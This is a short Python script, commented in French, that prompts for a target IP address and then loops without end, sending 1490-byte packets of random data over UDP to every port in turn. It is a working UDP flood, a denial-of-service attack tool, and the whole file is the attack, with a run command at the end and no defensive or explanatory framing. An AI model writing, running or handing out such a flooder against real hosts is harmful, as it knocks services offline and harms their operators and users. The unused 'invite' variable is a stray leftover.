import socket
import random

# input pour attquer
site = input("entrer l'IP : ")
# On ouvre la connexion
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#Envoie package à volonté
bytes = random._urandom(1490)

port = 1
sent = 0
while True:
    print(port)
    sock.sendto(bytes, (site,port))
    sent = sent + 1 
    port = port + 1
    invite = port + 1
    if port == 65534:
        port = 1
        
# python3 main.py
